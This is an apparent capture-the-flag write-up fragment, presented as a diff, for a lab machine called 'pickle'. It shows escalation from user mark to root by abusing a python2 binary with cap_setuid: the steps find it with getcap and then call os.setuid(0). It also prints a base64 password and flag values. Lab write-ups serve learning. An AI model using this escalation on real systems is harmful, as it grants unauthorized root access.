@@ -388,3 +388,25 @@ There is indeed mark, let's try with mark to get the password.
     Password: SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==
     mark@pickle:~$ cat user.txt
     e25fd1[...SNIP...]
+
+# Mark > Root
+
+Root is not very complicated, just look for files that support the capabilities.
+
+    mark@pickle:~$ getcap -r / 2>/dev/null
+    /home/mark/python2 = cap_setuid+ep
+    /usr/bin/ping = cap_net_raw+ep
+    
+You just need to run python and use the os module to run a command.
+
+    mark@pickle:~$ /home/mark/python2
+    /home/mark/python2
+    Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
+    [GCC 8.3.0] on linux2
+    Type "help", "copyright", "credits" or "license" for more information.
+    >>> import os
+    >>> os.setuid(0)
+    >>> os.system('cat /root/root.txt')
+    os.system('cat /root/root.txt')
+    7a32c9739cc63ed983ae01af2577c01c
+    
